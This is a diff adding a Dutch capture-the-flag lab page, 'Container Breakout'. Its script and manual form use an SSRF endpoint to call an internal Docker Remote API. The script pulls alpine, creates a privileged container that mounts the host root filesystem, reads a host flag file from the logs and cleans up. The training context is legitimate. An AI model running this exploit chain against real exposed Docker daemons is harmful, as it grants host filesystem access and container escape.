@@ -1,0 +1,205 @@
+<!doctype html>
+<html lang="nl">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Container Breakout (SSRF ➜ Docker API)</title>
+    <style>
+      :root { color-scheme: light dark; }
+      body { font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; margin: 2rem; color: #1f2937; line-height: 1.5; }
+      @media (prefers-color-scheme: dark) { body { color: #e5e7eb; background: #0b1220; } .card { border-color:#263247; background:#111827; color:#e5e7eb; } }
+      .wrap { max-width: 900px; margin: 0 auto; }
+      .card { border:1px solid #e5e7eb; border-radius:12px; padding:1rem 1.25rem; background:#ffffff; color:#111827; }
+      label { display:block; font-weight:600; margin:.5rem 0 .25rem; }
+      input, textarea, select { width:100%; padding:.6rem .7rem; border:1px solid #cbd5e1; border-radius:8px; font-family: inherit; }
+      textarea { min-height: 120px; font-family: ui-monospace, monospace; }
+      button { padding:.6rem .9rem; background:#2563eb; color:#fff; border:1px solid #1d4ed8; border-radius:8px; cursor:pointer; font-weight:600; }
+      button:hover { background:#1e40af; border-color:#1e40af; }
+      code { background:#f3f4f6; color:#111827; padding:.1rem .25rem; border-radius:4px; }
+      @media (prefers-color-scheme: dark) { code { background:#111827; color:#e2e8f0; } }
+      .muted { color:#6b7280; font-size:.9rem; }
+      pre { background:#0f172a; color:#e2e8f0; padding:1rem; border-radius:12px; overflow:auto; }
+      a.back { color:#2563eb; text-decoration:none; }
+      a.back:hover { text-decoration:underline; }
+    </style>
+  </head>
+  <body>
+    <p><a class="back" href="/">← Terug naar portaal</a></p>
+    <div class="wrap">
+      <h1>🐳 Container Breakout</h1>
+      <p class="muted">Hint: De Docker Remote API is intern bereikbaar. Standaard doel: <code>{{ dind }}</code></p>
+
+      <div class="card" style="margin:1rem 0;">
+        <h2>Handmatige Exploit</h2>
+        <form method="post" action="/fetch">
+          <label for="method">Methode</label>
+          <select id="method" name="method">
+            <option>GET</option>
+            <option>POST</option>
+            <option>PUT</option>
+            <option>DELETE</option>
+          </select>
+
+          <label for="url">URL</label>
+          <input id="url" name="url" placeholder="http://dind-host:2375/_ping" required>
+
+          <div style="display:flex; gap:.6rem; align-items:center; margin-top:.5rem;">
+            <label for="content_type" style="margin:0;">Body type</label>
+            <select id="content_type" name="content_type">
+              <option value="">auto</option>
+              <option value="json">application/json</option>
+            </select>
+          </div>
+
+          <label for="body">Body (optioneel)</label>
+          <textarea id="body" name="body" placeholder='{"Image":"alpine","Cmd":["/bin/sh","-c","cat /mnt/host/root/host-flag.txt"],"HostConfig":{"Binds":["/:/mnt/host:ro"],"Privileged":true}}'></textarea>
+
+          <div style="margin-top:.75rem;"><button type="submit">Versturen</button></div>
+        </form>
+      </div>
+
+      <div class="card">
+        <h2>Geleide Exploit</h2>
+        <p>Volg de stappen of klik op <strong>Auto-run</strong>. We gebruiken uitsluitend de SSRF endpoint <code>/fetch</code>.</p>
+        <div style="display:flex; gap:.5rem; flex-wrap:wrap; margin:.5rem 0 1rem;">
+          <button id="btn-auto" type="button">▶ Auto-run</button>
+          <button id="btn-ping" type="button">1) Ping API</button>
+          <button id="btn-pull" type="button">2) Pull alpine</button>
+          <button id="btn-create" type="button">3) Create container</button>
+          <button id="btn-start" type="button" disabled>4) Start</button>
+          <button id="btn-logs" type="button" disabled>5) Get logs</button>
+          <button id="btn-clean" type="button" disabled>Cleanup</button>
+        </div>
+        <div id="status" class="muted" aria-live="polite">Klaar.</div>
+        <pre id="output" style="margin-top:.75rem; white-space:pre-wrap;"></pre>
+      </div>
+
+      <div class="card">
+        <h2>Handleiding</h2>
+        <pre>
+1) GET {{ dind }}/_ping => OK
+2) POST {{ dind }}/images/create?fromImage=alpine&tag=latest
+3) POST {{ dind }}/containers/create  (bind "/:/mnt/host:ro")
+4) POST {{ dind }}/containers/{id}/start
+5) GET  {{ dind }}/containers/{id}/logs?stdout=1
+        </pre>
+      </div>
+    </div>
+
+    <script>
+      (function(){
+        const dind = {{ dind|tojson }};
+        const output = document.getElementById('output');
+        const statusEl = document.getElementById('status');
+        const btnAuto = document.getElementById('btn-auto');
+        const btnPing = document.getElementById('btn-ping');
+        const btnPull = document.getElementById('btn-pull');
+        const btnCreate = document.getElementById('btn-create');
+        const btnStart = document.getElementById('btn-start');
+        const btnLogs = document.getElementById('btn-logs');
+        const btnClean = document.getElementById('btn-clean');
+        let cid = null;
+
+        function log(txt){ output.textContent += (typeof txt === 'string' ? txt : JSON.stringify(txt,null,2)) + "\n"; output.scrollTop = output.scrollHeight; }
+        function setStatus(txt){ statusEl.textContent = txt; }
+        function enable(el, on=true){ el.disabled = !on; }
+
+        async function ssrfFetch(params){
+          const body = new URLSearchParams(params);
+          const res = await fetch('/fetch', { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body });
+          const text = await res.text();
+          return { status: res.status, text };
+        }
+
+        async function stepPing(){
+          setStatus('Pingen...');
+          const r = await ssrfFetch({ url: dind + '/_ping', method:'GET' });
+          log('[_ping]\n' + r.text);
+          setStatus('Ping gereed');
+          return r.text.trim() === 'OK';
+        }
+
+        async function stepPull(){
+          setStatus('Pull alpine...');
+          const r = await ssrfFetch({ url: dind + '/images/create?fromImage=alpine&tag=latest', method:'POST' });
+          log('[pull alpine]\n' + r.text);
+          setStatus('Pull gereed');
+          return true;
+        }
+
+        async function stepCreate(){
+          setStatus('Container aanmaken...');
+          const payload = {
+            Image: 'alpine',
+            Cmd: ['/bin/sh','-c','cat /mnt/host/root/host-flag.txt'],
+            HostConfig: { Binds: ['/:/mnt/host:ro'], Privileged: true }
+          };
+          const r = await ssrfFetch({ url: dind + '/containers/create', method:'POST', content_type:'json', body: JSON.stringify(payload) });
+          log('[create]\n' + r.text);
+          try {
+            const j = JSON.parse(r.text);
+            cid = j.Id || j.id || cid;
+          } catch(e) {}
+          if(cid){ enable(btnStart,true); enable(btnClean,true); setStatus('Container aangemaakt: ' + cid.substring(0,12)); return true; }
+          setStatus('Aanmaken mislukt');
+          return false;
+        }
+
+        async function stepStart(){
+          if(!cid) return false;
+          setStatus('Starten...');
+          const r = await ssrfFetch({ url: dind + '/containers/' + cid + '/start', method:'POST' });
+          log('[start] status ' + r.status);
+          enable(btnLogs,true);
+          setStatus('Gestart');
+          return true;
+        }
+
+        async function stepLogs(){
+          if(!cid) return false;
+          setStatus('Logs ophalen...');
+          const r = await ssrfFetch({ url: dind + '/containers/' + cid + '/logs?stdout=1', method:'GET' });
+          log('[logs]\n' + r.text);
+          const m = r.text.match(/CTF\{[^\n}]+\}/);
+          if(m){
+            setStatus('FLAG gevonden! ' + m[0]);
+          } else {
+            setStatus('Logs opgehaald');
+          }
+          return true;
+        }
+
+        async function stepClean(){
+          if(!cid) return;
+          setStatus('Opruimen...');
+          const r = await ssrfFetch({ url: dind + '/containers/' + cid + '?force=1', method:'DELETE' });
+          log('[cleanup] status ' + r.status);
+          setStatus('Opgeruimd');
+          cid = null; enable(btnStart,false); enable(btnLogs,false); enable(btnClean,false);
+        }
+
+        async function autoRun(){
+          btnAuto.disabled = true;
+          try {
+            await stepPing();
+            await stepPull();
+            const ok = await stepCreate();
+            if(!ok) return;
+            await stepStart();
+            await new Promise(r=>setTimeout(r,500));
+            await stepLogs();
+          } finally { btnAuto.disabled = false; }
+        }
+
+        btnPing.addEventListener('click', stepPing);
+        btnPull.addEventListener('click', stepPull);
+        btnCreate.addEventListener('click', stepCreate);
+        btnStart.addEventListener('click', stepStart);
+        btnLogs.addEventListener('click', stepLogs);
+        btnClean.addEventListener('click', stepClean);
+        btnAuto.addEventListener('click', autoRun);
+      })();
+    </script>
+  </body>
+</html>
+
